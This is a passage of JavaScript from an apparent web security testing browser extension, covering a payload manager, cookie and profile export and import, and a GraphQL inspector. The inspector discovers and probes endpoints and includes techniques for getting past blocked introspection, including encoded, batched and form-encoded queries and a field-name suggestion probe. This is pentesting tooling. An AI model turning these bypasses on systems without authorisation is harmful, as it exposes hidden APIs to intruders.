    if (!value) { toast('Payload required', 'error'); return; }
    const groupDef = this.allCats().find(c => c.cat === cat);
    const existingValues = groupDef ? [...(groupDef.payloads || []), ...(groupDef.customPayloads || [])] : [];
    if (existingValues.includes(value)) { toast('Payload already exists', 'warn'); return; }
    let group = state.customPayloadCats.find(c => c.cat === cat);
    if (!group) {
      group = { id: Date.now(), cat, payloads: [] };
      state.customPayloadCats.push(group);
    }
    group.payloads.push(value);
    state.payloadGroupOrders[cat] = [...this.orderedRows(cat, existingValues.map(v => ({ value: v }))).map(r => r.value), value];
    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats, payloadGroupOrders: state.payloadGroupOrders });
    this.renderCustomList();
    this.render();
    toast('Payload added', 'success');
  },

  orderedRows(cat, rows) {
    const order = state.payloadGroupOrders[cat] || [];
    if (!order.length) return rows;
    const byValue = new Map(rows.map(r => [r.value, r]));
    return [
      ...order.map(v => byValue.get(v)).filter(Boolean),
      ...rows.filter(r => !order.includes(r.value)),
    ];
  },

  async reorderPayload(cat, draggedValue, targetValue) {
    if (!draggedValue || !targetValue || draggedValue === targetValue) return;
    const group = this.allCats().find(c => c.cat === cat);
    if (!group) return;
    const rows = this.orderedRows(cat, [
      ...(group.payloads || []).map(p => ({ value: p })),
      ...(group.customPayloads || []).map(p => ({ value: p })),
    ]);
    const from = rows.findIndex(r => r.value === draggedValue);
    const to = rows.findIndex(r => r.value === targetValue);
    if (from < 0 || to < 0) return;
    const [moved] = rows.splice(from, 1);
    rows.splice(to, 0, moved);
    state.payloadGroupOrders[cat] = rows.map(r => r.value);
    await chrome.storage.local.set({ payloadGroupOrders: state.payloadGroupOrders });
    this.render();
  },

  async deletePayload(cat, customIdx) {
    const group = state.customPayloadCats.find(c => c.cat === cat);
    if (!group) return;
    const removed = group.payloads[customIdx];
    group.payloads.splice(customIdx, 1);
    if (!group.payloads.length) {
      state.customPayloadCats = state.customPayloadCats.filter(c => c !== group);
    }
    state.payloadGroupOrders[cat] = (state.payloadGroupOrders[cat] || []).filter(v => v !== removed);
    await chrome.storage.local.set({ customPayloadCats: state.customPayloadCats, payloadGroupOrders: state.payloadGroupOrders });
    this.renderCustomList();
    this.render();
    toast('Payload removed', 'success');
  },

  renderCustomList() {
    const el = $('payload-custom-list');
    if (!el) return;
    if (!state.customPayloadCats.length) {
      el.innerHTML = '<div class="muted" style="font-size:12px">No custom payload groups</div>';
      return;
    }
    const builtInNames = new Set(PAYLOAD_CATS.filter(c => c.cat !== 'GraphQL (GET)').map(c => c.cat));
    el.innerHTML = state.customPayloadCats.map(c => `
      <div class="payload-custom-row">
        <span><b>${esc(c.cat)}</b> ${(builtInNames.has(c.cat) || c.cat === 'GraphQL (GET)') ? '<span class="badge">ADDED TO BUILT-IN</span>' : '<span class="badge">CUSTOM</span>'} <span class="muted">(${c.payloads.length})</span></span>
        <button class="sm" data-action="payload-edit-custom" data-id="${c.id}">Edit</button>
        <button class="sm danger" data-action="payload-delete-custom" data-id="${c.id}">Delete</button>
      </div>
    `).join('');
  },

  render() {
    const out = $('payload-output');
    if (!out) return;
    const q = this.filter.toLowerCase();
    let html = '';
    this.allCats().forEach(({ cat, payloads, custom, customPayloads = [] }, idx) => {
      const rows = [
        ...payloads.map(p => ({ value: p, source: 'built-in' })),
        ...customPayloads.map((p, customIdx) => ({ value: p, source: 'custom', customIdx })),
      ];
      const orderedRows = this.orderedRows(cat, rows);
      const displayRows = orderedRows.map(r => ({ ...r, displayValue: this.displayValue(cat, r.value) }));
      const visible = q
        ? displayRows.filter(r => r.displayValue.toLowerCase().includes(q) || r.value.toLowerCase().includes(q) || cat.toLowerCase().includes(q))
        : displayRows;
      if (!visible.length) return;
      const methodToggle = cat === 'GraphQL'
        ? `<span class="payload-method-toggle" role="group" aria-label="GraphQL payload method">
            <button class="payload-method-btn${this.graphQLPayloadMethod() === 'POST' ? ' active' : ''}" data-action="payload-graphql-method" data-method="POST" type="button">POST</button>
            <button class="payload-method-btn${this.graphQLPayloadMethod() === 'GET' ? ' active' : ''}" data-action="payload-graphql-method" data-method="GET" type="button">GET</button>
          </span>`
        : '';
      html += `<div class="recon-section">
	        <h4>${esc(cat)}${custom ? ' <span class="badge">CUSTOM</span>' : ''} <span class="dim">(${visible.length})</span>
	          ${methodToggle}
	          <button class="payload-copy-all recon-copy-btn" data-idx="${idx}" title="Copy all">Copy all</button>
	        </h4>
	        <div class="payload-list" data-cat="${esc(cat)}">`;
      visible.forEach(row => {
        html += `<div class="payload-row" draggable="true" data-cat="${esc(cat)}" data-val="${esc(row.value)}">
	          <span class="payload-drag-handle" title="Drag to reorder"></span>
	          <span class="payload-text" title="${esc(row.displayValue)}">${esc(row.displayValue)}${row.source === 'custom' ? ' <span class="badge">ADDED</span>' : ''}</span>
	          <div class="payload-actions">
	            ${row.source === 'custom' ? `
	              <button class="payload-delete-one recon-copy-btn" data-cat="${esc(cat)}" data-custom-idx="${row.customIdx}" title="Delete">Delete</button>
	            ` : ''}
	            <button class="payload-copy-one recon-copy-btn" data-val="${esc(row.displayValue)}" title="Copy">Copy</button>
	            <button class="payload-copy-urlencoded recon-copy-btn" data-val="${esc(row.displayValue)}" title="Copy URL encoded">URL Enc</button>
	            <button class="payload-send-encode recon-copy-btn" data-val="${esc(row.displayValue)}" title="Send to Encode / Decode">Encode</button>
	          </div>
	        </div>`;
      });
      html += `</div>
        <div class="payload-add-row">
          <input class="payload-add-input" data-cat="${esc(cat)}" placeholder="Add payload to ${esc(cat)}" autocomplete="off">
          <button class="payload-add-btn primary" data-cat="${esc(cat)}" type="button">Add Payload</button>
        </div>
      </div>`;
    });
    if (!html) html = '<div class="muted" style="padding:16px;font-size:13px">No payloads match</div>';
    out.innerHTML = html;
  },
};

// ─── Cookie Export / Import ───────────────────────────────────────────────────

function triggerDownload(filename, json) {
  const blob = new Blob([json], { type: 'application/json' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href = url; a.download = filename; a.click();
  URL.revokeObjectURL(url);
}

function exportCookies() {
  if (!state.cookiesCache.length) { toast('No cookies to export', 'warn'); return; }
  const hostname = (() => { try { return new URL(state.tabUrl).hostname; } catch { return 'cookies'; } })();
  triggerDownload(`cookies-${hostname}-${Date.now()}.json`, JSON.stringify(state.cookiesCache, null, 2));
  toast(`Exported ${state.cookiesCache.length} cookies`, 'success');
}

async function importCookies(file) {
  let cookies;
  try { cookies = JSON.parse(await file.text()); } catch { toast('Invalid JSON', 'error'); return; }
  if (!Array.isArray(cookies)) { toast('Expected JSON array', 'error'); return; }
  let ok = 0;
  for (const c of cookies) {
    if (!c.name || !c.domain) continue;
    const scheme = c.secure ? 'https' : 'http';
    const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
    const cookie = buildCookieSetDetails({
      url:      `${scheme}://${host}${c.path || '/'}`,
      name:     c.name, value: c.value || '',
      domain:   c.domain, path: c.path || '/',
      httpOnly: !!c.httpOnly, secure: !!c.secure,
      sameSite: c.sameSite || 'unspecified',
    });
    if (c.expirationDate) cookie.expirationDate = c.expirationDate;
    const { error } = await bg('SET_COOKIE', { cookie });
    if (!error) ok++;
  }
  await Cookies.load();
  toast(`Imported ${ok} / ${cookies.length} cookies`, ok === cookies.length ? 'success' : 'warn');
}

// ─── Profiles Export / Import ─────────────────────────────────────────────────

async function exportProfiles() {
  const data = await chrome.storage.local.get(['roles', 'uaProfiles', 'proxyProfiles', 'headerProfiles']);
  triggerDownload(`spectre-profiles-${Date.now()}.json`, JSON.stringify({ version: 1, ...data }, null, 2));
  toast('Profiles exported', 'success');
}

async function importProfiles(file) {
  let data;
  try { data = JSON.parse(await file.text()); } catch { toast('Invalid JSON', 'error'); return; }
  const {
    roles = [], uaProfiles = [], proxyProfiles = [], headerProfiles = [],
  } = data;
  await chrome.storage.local.set({ roles, uaProfiles, proxyProfiles, headerProfiles });
  state.roles = roles;
  Auth.renderRoles();
  UserAgent.profiles = uaProfiles;
  UserAgent.renderProfiles();
  Proxy.profiles = proxyProfiles;
  Proxy.renderProfiles();
  HeaderProfiles.profiles = headerProfiles;
  HeaderProfiles.renderProfiles();
  bg('SYNC_ROLE_MENUS');
  toast(`Imported: ${roles.length} roles, ${uaProfiles.length} UA, ${proxyProfiles.length} proxy, ${headerProfiles.length} header profiles`, 'success');
}


// ─── GraphQL Inspector ────────────────────────────────────────────────────────

const GraphQL = (() => {
  const INTROSPECTION_GQL = '{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name description fields(includeDeprecated:true){name description isDeprecated args{name type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}inputFields{name type{kind name ofType{kind name}}}enumValues(includeDeprecated:true){name description isDeprecated}possibleTypes{name}}directives{name description locations args{name type{kind name}}}}}';
  const INTROSPECTION_OP_QUERY = 'query IntrospectionQuery ' + INTROSPECTION_GQL;
  const COMMON_ENDPOINT_PATHS = ['/graphql', '/api/graphql', '/v1/graphql', '/gql'];

  let _endpoints = [];
  let _endpointDetails = new Map();

  function spectreDetectGraphQL() {
    const domValues = [];
    const addDomValue = (value, source) => {
      if (value) domValues.push({ value: String(value), source });
    };
    document.querySelectorAll('script:not([src])').forEach(s => addDomValue(s.textContent, 'inline script'));
    document.querySelectorAll('script[src]').forEach(s => addDomValue(s.src, 'script src'));
    document.querySelectorAll('a[href],form[action],link[href],iframe[src]').forEach(el => {
      addDomValue(el.href || el.action || el.src, el.tagName.toLowerCase());
    });
    document.querySelectorAll('[data-url],[data-uri],[data-endpoint],[data-graphql],[data-gql],[data-path],[data-route]').forEach(el => {
      ['url','uri','endpoint','graphql','gql','path','route'].forEach(k => addDomValue(el.dataset?.[k], `data-${k}`));
    });
    let resources = [];
    try { resources = performance.getEntriesByType('resource').map(r => r.name).filter(Boolean); } catch {}
    const scripts = Array.from(document.querySelectorAll('script[src]')).map(s => s.src).filter(Boolean);
    return {
      href: location.href,
      origin: location.origin,
      domValues,
      scripts: [...new Set([...scripts, ...resources.filter(u => /\.m?js(?:[?#]|$)/i.test(u))])].slice(0, 50),
      resourceUrls: resources.slice(0, 250),
    };
  }

  function scoreGraphQLCandidate(url, reason = '') {
    let score = 1;
    if (/graphql/i.test(url)) score += 8;
    if (/(^|\/)gql(\/|$|[?#])/i.test(url)) score += 6;
    if (/(^|\/)(query|api)(\/|$|[?#])/i.test(url)) score += 2;
    if (/persisted|operationName|__schema|__type|IntrospectionQuery/i.test(reason)) score += 5;
    return score;
  }

  function rememberCandidate(found, rawUrl, base, source, reason) {
    const abs = absolutizeUrl(rawUrl, base);
    if (!abs || !isHttpUrl(abs)) return;
    let url;
    try {
      const parsed = new URL(abs);
      if (parsed.searchParams.has('query') || parsed.searchParams.has('operationName') || parsed.searchParams.has('extensions')) {
        parsed.search = '';
      }
      parsed.hash = '';
      url = parsed.href;
    } catch { return; }
    const item = found.get(url) || { url, sources: new Set(), reasons: new Set(), score: 0 };
    item.sources.add(source || 'scan');
    item.reasons.add(reason || 'GraphQL hint');
    item.score += scoreGraphQLCandidate(url, reason);
    item.guess = item.guess ?? source === 'common path';
    if (source !== 'common path') item.guess = false;
    found.set(url, item);
  }

  function graphQLReason(raw, context = '') {
    const hay = `${raw}\n${context}`;
    if (/\/graphql(?:\/|$|[?#])|graphqlEndpoint|graphQLEndpoint/i.test(hay)) return 'GraphQL path';
    if (/(^|\/)gql(?:\/|$|[?#])|gqlEndpoint/i.test(hay)) return 'GQL path';
    if (/[?&]query=|[?&]operationName=|persistedQuery/i.test(raw)) return 'GraphQL request URL';
    if (/__schema|__type|IntrospectionQuery/i.test(hay)) return 'Introspection query nearby';
    if (/(apollo|urql|relay|GraphQLClient|createHttpLink|HttpLink|graphql-request)/i.test(context) && /(?:^|\/)(api|query)(?:\/|$|[?#])/i.test(raw)) return 'GraphQL client endpoint';
    return null;
  }

  function scanTextForGraphQL(text, base, source, found) {
    if (!text) return;
    const patterns = [
      /https?:\/\/[^\s"'`<>)\\]+/gi,
      /["'`]((?:\/|\.\.?\/|[A-Za-z0-9_-]+\/)(?:[^"'`<>{}\\]|\\.){1,240})["'`]/g,
      /(?:uri|url|endpoint|graphqlEndpoint|graphQLEndpoint|gqlEndpoint|path|route)\s*[:=]\s*["'`]([^"'`]{1,240})["'`]/gi,
    ];
    patterns.forEach(re => {
      for (const m of text.matchAll(re)) {
        const raw = (m[1] || m[0] || '').replace(/\\\//g, '/').trim();
        const context = text.slice(Math.max(0, (m.index || 0) - 140), (m.index || 0) + raw.length + 180);
        const reason = graphQLReason(raw, context);
        if (reason) rememberCandidate(found, raw, base, source, reason);
      }
    });
  }

  async function collectEndpointCandidates(pageInfo) {
    const found = new Map();
    const pageUrl = pageInfo?.href || state.tabUrl;
    const origin = pageInfo?.origin || (() => { try { return new URL(pageUrl).origin; } catch { return ''; } })();
    COMMON_ENDPOINT_PATHS.forEach(p => rememberCandidate(found, p, origin, 'common path', 'Common GraphQL endpoint'));
    (pageInfo?.domValues || []).forEach(({ value, source }) => scanTextForGraphQL(value, pageUrl, source, found));
    (pageInfo?.resourceUrls || []).forEach(value => scanTextForGraphQL(value, pageUrl, 'loaded resource', found));

    const pageResp = await bg('FETCH', { url: pageUrl, maxBody: 500000 }).catch(() => null);
    if (pageResp?.body) scanTextForGraphQL(pageResp.body, pageUrl, 'page source', found);

    const scripts = [...new Set(pageInfo?.scripts || [])].slice(0, 35);
    for (const scriptUrl of scripts) {
      const resp = await bg('FETCH', { url: scriptUrl, maxBody: 900000 }).catch(() => null);
      if (resp?.body) scanTextForGraphQL(resp.body, scriptUrl, scriptUrl, found);
    }

    return [...found.values()]
      .sort((a, b) => b.score - a.score || a.url.localeCompare(b.url))
      .slice(0, 60)
      .map(item => ({
        url: item.url,
        sources: [...item.sources].slice(0, 3),
        reasons: [...item.reasons].slice(0, 3),
        guess: item.guess,
        score: item.score,
      }));
  }

  function describeEndpoint(url) {
    const info = _endpointDetails.get(url);
    if (!info) return '';
    const bits = [];
    if (info.probe?.label) bits.push(info.probe.label);
    bits.push(...(info.reasons || []), ...(info.sources || []));
    const details = [...new Set(bits)].slice(0, 5);
    return details.length ? `<div class="graphql-candidate-meta">${esc(details.join(' | '))}</div>` : '';
  }

  function endpointBadge(info) {
    const status = info?.probe?.status || (info?.guess ? 'guess' : 'found');
    const label = {
      confirmed: 'CONFIRMED',
      possible: 'POSSIBLE',
      blocked: 'BLOCKED',
      found: 'FOUND',
      guess: 'GUESS',
      missing: 'MISSING',
      error: 'ERROR',
    }[status] || status.toUpperCase();
    return `<span class="badge graphql-endpoint-status ${esc(status)}">${esc(label)}</span>`;
  }

  function isGraphQLResponse(data, body, headers = {}) {
    const ctype = headers['content-type'] || headers['Content-Type'] || '';
    if (data && typeof data === 'object' && ('data' in data || 'errors' in data)) return true;
    return /graphql|json/i.test(ctype) && /"errors"|"data"|Cannot query field|GraphQL|Did you mean/i.test(body || '');
  }

  function classifyProbeResponse(res, method) {
    if (res.error) return { status: 'error', label: `Probe ${method}: ${res.error}` };
    const code = Number(res.status || 0);
    const body = res.body || '';
    let data = null;
    try { data = JSON.parse(body); } catch {}
    if (isGraphQLResponse(data, body, res.headers || {})) {
      if (data?.data?.__typename || data?.data || data?.errors?.length) {
        return { status: 'confirmed', label: `GraphQL response via ${method} (${code || 'ok'})`, httpStatus: code };
      }
      return { status: 'possible', label: `GraphQL-like response via ${method} (${code || 'ok'})`, httpStatus: code };
    }
    if ([401, 403].includes(code)) return { status: 'blocked', label: `Endpoint exists but returned HTTP ${code}`, httpStatus: code };
    if ([400, 405, 415].includes(code) && /query|graphql|json|method|POST|GET/i.test(body)) {
      return { status: 'possible', label: `GraphQL-like HTTP ${code} via ${method}`, httpStatus: code };
    }
    if (code === 404) return { status: 'missing', label: `HTTP 404 via ${method}`, httpStatus: code };
    if (code >= 500) return { status: 'possible', label: `Server error HTTP ${code} via ${method}`, httpStatus: code };
    return { status: 'missing', label: code ? `No GraphQL signal via ${method} (HTTP ${code})` : `No response signal via ${method}`, httpStatus: code };
  }

  async function probeEndpoint(url) {
    const body = JSON.stringify({ query: '{__typename}' });
    const post = classifyProbeResponse(await bg('FETCH', {
      url,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body,
      maxBody: 25000,
    }).catch(e => ({ error: String(e) })), 'POST');
    if (['confirmed', 'blocked', 'possible'].includes(post.status)) return post;

    const getUrl = url + (url.includes('?') ? '&' : '?') + 'query=' + encodeURIComponent('{__typename}');
    const get = classifyProbeResponse(await bg('FETCH', { url: getUrl, method: 'GET', maxBody: 25000 }).catch(e => ({ error: String(e) })), 'GET');
    return ['confirmed', 'blocked', 'possible'].includes(get.status) ? get : post;
  }

  async function probeEndpointCandidates(candidates, output) {
    const probed = [];
    const total = candidates.length;
    for (const [idx, candidate] of candidates.entries()) {
      output.innerHTML = `<div class="muted">Probing GraphQL candidates (${idx + 1}/${total})…</div>`;
      const probe = await probeEndpoint(candidate.url);
      probed.push({ ...candidate, probe });
    }
    const rank = { confirmed: 0, blocked: 1, possible: 2, found: 3, guess: 4, missing: 5, error: 6 };
    return probed
      .filter(c => c.probe.status !== 'missing' || !c.guess)
      .sort((a, b) => (rank[a.probe.status] ?? 9) - (rank[b.probe.status] ?? 9) || b.score - a.score || a.url.localeCompare(b.url));
  }

  let _currentUrl = '';
  let _types = [];

  function typeStr(t) {
    if (!t) return '?';
    if (t.kind === 'NON_NULL') return typeStr(t.ofType) + '!';
    if (t.kind === 'LIST') return '[' + typeStr(t.ofType) + ']';
    return t.name || '?';
  }

  function argDefault(t, visited = new Set()) {
    if (!t) return 'null';
    if (t.kind === 'NON_NULL') return argDefault(t.ofType, visited);
    if (t.kind === 'LIST') return '[]';
    if (t.name === 'String') return '""';
    if (t.name === 'Int' || t.name === 'Float') return '0';
    if (t.name === 'Boolean') return 'false';
    if (t.name === 'ID') return '""';
    if (t.kind === 'ENUM') {
      const enumType = _types.find(et => et.name === t.name);
      const firstVal = enumType?.enumValues?.[0]?.name;
      return firstVal || 'null';
    }
    if (t.kind === 'INPUT_OBJECT' && !visited.has(t.name)) {
      const inputType = _types.find(it => it.name === t.name);
      if (inputType?.inputFields?.length) {
        const next = new Set([...visited, t.name]);
        const fields = inputType.inputFields.map(f => `${f.name}: ${argDefault(f.type, next)}`).join(', ');
        return `{${fields}}`;
      }
    }
    return 'null';
  }

  function unwrapTypeName(t) {
    if (!t) return null;
    if (t.kind === 'NON_NULL' || t.kind === 'LIST') return unwrapTypeName(t.ofType);
    return t.name;
  }

  function expandFields(typeName, indent = '    ', visited = new Set()) {
    if (visited.has(typeName)) return `${indent}__typename`;
    const type = _types.find(t => t.name === typeName);
    if (!type?.fields?.length) return `${indent}__typename`;
    const next = new Set([...visited, typeName]);
    return type.fields.map(f => {
      const baseName = unwrapTypeName(f.type);
      const baseType = _types.find(t => t.name === baseName);
      if (!baseType || baseType.kind === 'SCALAR' || baseType.kind === 'ENUM') {
        return `${indent}${f.name}`;
      } else if (baseType.kind === 'OBJECT' && indent.length <= 12) {
        const nested = expandFields(baseName, indent + '  ', next);
        return `${indent}${f.name} {\n${nested}\n${indent}}`;
      } else {
        return `${indent}${f.name} { __typename }`;
      }
    }).join('\n');
  }

  function buildQueryBody(fieldName, args, opType, returnTypeName) {
    const argsStr = args?.length
      ? '(' + args.map(a => `${a.name}: ${argDefault(a.type)}`).join(', ') + ')'
      : '';
    const keyword = opType === 'mutation' ? 'mutation' : 'query';
    const fields = returnTypeName ? expandFields(returnTypeName) : '    __typename';
    const q = `${keyword} {\n  ${fieldName}${argsStr} {\n${fields}\n  }\n}`;
    return JSON.stringify({ query: q }, null, 2);
  }

  function sendToDispatch(url, body) {
    const method = $('graphql-method')?.value || 'POST';
    if (method === 'GET') {
      let queryStr = body;
      try { queryStr = JSON.parse(body).query ?? body; } catch {}
      $('dispatch-url').value = url + (url.includes('?') ? '&' : '?') + 'query=' + encodeURIComponent(queryStr);
      $('dispatch-method').value = 'GET';
      $('dispatch-headers').value = '';
      $('dispatch-body').value = '';
      $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelector('#tab-dispatch .dispatch-tab-btn[data-pane="headers"]')?.classList.add('active');
      $('dispatch-headers').classList.remove('hidden');
      $('dispatch-body').classList.add('hidden');
    } else {
      $('dispatch-url').value = url;
      $('dispatch-method').value = 'POST';
      $('dispatch-headers').value = 'Content-Type: application/json';
      $('dispatch-body').value = body;
      $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelector('#tab-dispatch .dispatch-tab-btn[data-pane="body"]')?.classList.add('active');
      $('dispatch-headers').classList.add('hidden');
      $('dispatch-body').classList.remove('hidden');
    }
    activateTab('dispatch');
    toast('Sent to Dispatch', 'success');
  }

  function renderFields(fields, opType = null) {
    if (!fields?.length) return '<div class="graphql-field dim">No fields</div>';
    return fields.map(f => {
      const returnTypeName = opType ? unwrapTypeName(f.type) : null;
      const dispatchBody = opType ? buildQueryBody(f.name, f.args, opType, returnTypeName) : null;
      return `<div class="graphql-field${f.isDeprecated ? ' deprecated' : ''}" data-fname="${esc(f.name.toLowerCase())}">
        <span class="graphql-fname">${esc(f.name)}</span>
        <span class="graphql-ftype">${esc(typeStr(f.type))}</span>
        ${f.args?.length ? `<span class="graphql-fargs">(${f.args.map(a => esc(a.name) + ': ' + esc(typeStr(a.type))).join(', ')})</span>` : ''}
        ${f.isDeprecated ? '<span class="badge badge-warn">deprecated</span>' : ''}
        ${f.description ? `<div class="graphql-fdesc dim">${esc(f.description)}</div>` : ''}
        ${dispatchBody ? `<button class="recon-copy-btn gql-dispatch-btn" data-action="gql-field-dispatch" data-body="${esc(dispatchBody)}">&#8594; Dispatch</button>` : ''}
      </div>`;
    }).join('');
  }

  function section(title, count, body, extraClass = '') {
    return `<div class="graphql-section${extraClass}">
      <div class="graphql-section-header" data-action="graphql-toggle">
        <span class="graphql-section-title">${esc(title)}</span>
        <span class="badge">${count}</span>
        <span class="recon-section-caret">&#9662;</span>
      </div>
      <div class="graphql-section-body">${body}</div>
    </div>`;
  }

  function inferGraphQLError(data) {
    if (!data?.errors?.length) return '';
    return data.errors.map(e => e?.message || JSON.stringify(e)).filter(Boolean).join('\n');
  }

  function parseGraphQLResponse(res) {
    if (res.error || !res.body) return { error: `Request failed: ${res.error || 'No response'}` };
    try { return { data: JSON.parse(res.body) }; }
    catch { return { error: 'Invalid JSON response — is this a GraphQL endpoint?' }; }
  }

  function schemaFromData(data) {
    return data?.data?.__schema || null;
  }

  function typeProbeFromData(data) {
    return data?.data?.__type || null;
  }

  function encodedJsonBody(payload) {
    return JSON.stringify(payload).replace(/__/g, '\\u005f\\u005f');
  }

  function parseSuggestionNames(errors) {
    const names = new Set();
    (errors || []).forEach(err => {
      const msg = err?.message || String(err || '');
      const suggestionBlock = msg.match(/Did you mean ([\s\S]*?)(?:\?|$)/i)?.[1] || '';
      for (const m of suggestionBlock.matchAll(/["'`]([_A-Za-z][_0-9A-Za-z]*)["'`]/g)) names.add(m[1]);
    });
    return [...names].sort((a, b) => a.localeCompare(b));
  }

  function buildSuggestionProbeBody() {
    const probes = [
      'accountz', 'adminz', 'allUserz', 'authz', 'billingz', 'commentz',
      'configz', 'currentUserz', 'dashboardz', 'exportz', 'featurez',
      'flagz', 'groupz', 'healthz', 'invoicez', 'loginz', 'logz',
      'meez', 'memberz', 'messagez', 'nodez', 'orderz', 'organizationz',
      'paymentz', 'permissionz', 'planez', 'policyz', 'productz', 'profilez',
      'registerz', 'reportz', 'rolez', 'searchz', 'secretz', 'servicez',
      'sessionz', 'settingz', 'statuz', 'subscriptionz', 'teamz', 'tokenz',
      'updatePasswordz', 'uploadz', 'userz', 'viewerz', 'webhookz',
    ];
    return JSON.stringify({ query: `query SpectreFieldProbe {\n  ${probes.join('\n  ')}\n}` });
  }

  function renderSuggestionProbe(names, url, errors = []) {
    _currentUrl = url;
    const output = $('graphql-output');
    const fields = names.map(name => ({
      name,
      type: { kind: 'SCALAR', name: 'Unknown' },
      args: [],
      description: 'Discovered from GraphQL validation suggestions',
    }));
    output.innerHTML = `
      <div class="graphql-header">
        <span class="graphql-endpoint-label">${esc(url)} <span class="dim">(partial — validation suggestions)</span></span>
        <button class="recon-copy-btn gql-dispatch-btn" data-action="gql-to-dispatch">&#8594; Dispatch</button>
      </div>
      ${names.length ? section('Suggested Query Fields', names.length, renderFields(fields)) : '<div class="error-msg">No field suggestions were returned. The endpoint appears to block introspection and does not leak validation suggestions for the current probe set.</div>'}
      ${errors.length ? section('Probe Errors', errors.length, errors.slice(0, 8).map(e => `<pre class="code-block">${esc(e?.message || JSON.stringify(e))}</pre>`).join('')) : ''}
    `;
  }

  async function detect() {
    const output = $('graphql-output');
    output.innerHTML = '<div class="muted">Scanning page, resources, and JS bundles for GraphQL endpoints…</div>';
    let pageInfo;
    try { pageInfo = await execPage(spectreDetectGraphQL); }
    catch (e) { output.innerHTML = `<div class="error-msg">${esc(e.message)}</div>`; return; }
    const candidates = await collectEndpointCandidates(pageInfo);
    if (!candidates.length) {
      _endpoints = [];
      _endpointDetails = new Map();
      output.innerHTML = '<div class="muted">No GraphQL endpoint candidates found in the page, resources, or common paths.</div>';
      return;
    }
    const probed = await probeEndpointCandidates(candidates, output);
    _endpoints = probed.map(c => c.url);
    _endpointDetails = new Map(probed.map(c => [c.url, c]));
    const urlInput = $('graphql-url');
    if (urlInput && _endpoints.length) urlInput.value = _endpoints[0];
    output.innerHTML = `<div class="graphql-candidates">
      <div class="section-label" style="margin-bottom:6px">Candidates — confirmed first, guesses only shown if useful</div>
      ${_endpoints.length ? _endpoints.map(e => {
        const info = _endpointDetails.get(e);
        return `<div class="graphql-candidate" data-action="graphql-pick" data-url="${esc(e)}"><div class="graphql-candidate-main"><span>${esc(e)}</span>${endpointBadge(info)}</div>${describeEndpoint(e)}</div>`;
      }).join('') : '<div class="muted">No live GraphQL candidates found. Common-path guesses were probed and filtered out.</div>'}
    </div>`;
  }

  const BYPASSES = {
    newline:   { label: 'Newline prefix',    gql: '\n  ' + INTROSPECTION_GQL },
    opname:    { label: 'operationName',     body: JSON.stringify({ operationName: 'IntrospectionQuery', query: INTROSPECTION_OP_QUERY, variables: {} }) },
    typename:  { label: '__type probe',      body: JSON.stringify({ query: '{__type(name:"Query"){name fields{name description type{name kind ofType{name kind}}}}}' }) },
    minimal:   { label: 'Minimal schema',    gql: '{__schema{queryType{name}mutationType{name}types{name kind}}}' },
    encoded:   { label: 'Encoded body',      body: encodedJsonBody({ query: INTROSPECTION_OP_QUERY, operationName: 'IntrospectionQuery' }) },
    applgql:   { label: 'application/graphql content-type', rawBody: INTROSPECTION_GQL, headers: { 'Content-Type': 'application/graphql' } },
    batch:     { label: 'Batch array',       body: JSON.stringify([{ query: INTROSPECTION_GQL }]), headers: { 'Content-Type': 'application/json' } },
    formenc:   { label: 'Form-encoded body', rawBody: 'query=' + encodeURIComponent(INTROSPECTION_GQL), headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
    suggest:   { label: 'Suggestion probe',  body: buildSuggestionProbeBody(), nonIntrospection: true },
  };

  const AUTO_INTROSPECTION_ATTEMPTS = [
    { label: 'standard POST',              gql: INTROSPECTION_GQL },
    { label: 'named operation',            body: JSON.stringify({ operationName: 'IntrospectionQuery', query: INTROSPECTION_OP_QUERY, variables: {} }) },
    { label: 'minimal schema',             gql: BYPASSES.minimal.gql },
    { label: 'newline prefix',             gql: BYPASSES.newline.gql },
    { label: 'encoded body',               body: BYPASSES.encoded.body },
    { label: 'application/graphql',        rawBody: BYPASSES.applgql.rawBody, headers: BYPASSES.applgql.headers },
    { label: 'batch array',                body: BYPASSES.batch.body, headers: BYPASSES.batch.headers },
    { label: 'form-encoded',               rawBody: BYPASSES.formenc.rawBody, headers: BYPASSES.formenc.headers },
    { label: '__type probe',               body: BYPASSES.typename.body },
  ];

  async function runIntrospectFetch(url, gqlOverride, bodyOverride, methodOverride, headersOverride, rawBodyOverride) {
    const method = methodOverride || $('graphql-method')?.value || 'POST';
    const gql  = gqlOverride  ?? INTROSPECTION_GQL;
    const body = rawBodyOverride ?? bodyOverride ?? JSON.stringify({ query: gql });
    let getUrl = url;
    if (method === 'GET') {
      let query = gql;
      const params = new URLSearchParams();
      try {
        const parsed = JSON.parse(body);
        query = parsed.query || query;
        if (parsed.operationName) params.set('operationName', parsed.operationName);
        if (parsed.variables && Object.keys(parsed.variables).length) params.set('variables', JSON.stringify(parsed.variables));
        if (parsed.extensions) params.set('extensions', JSON.stringify(parsed.extensions));
      } catch {}
      params.set('query', query);
      getUrl = url + (url.includes('?') ? '&' : '?') + params.toString();
    }
    const defaultHeaders = headersOverride || { 'Content-Type': 'application/json' };
    const fetchOpts = method === 'GET'
      ? { url: getUrl, method: 'GET', maxBody: 2000000 }
      : { url, method: 'POST', headers: defaultHeaders, body, maxBody: 2000000 };
    return bg('FETCH', fetchOpts);
  }

  function showBypassOptions(output, errMsg) {
    output.innerHTML = `
      <div class="error-msg">${esc(errMsg)}</div>
      <div class="graphql-bypass-panel">
        <div class="section-label">Introspection blocked — try a bypass:</div>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="newline">Newline prefix</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="opname">operationName field</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="minimal">Minimal schema</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="encoded">Encoded body</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="applgql">application/graphql</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="batch">Batch array</button>
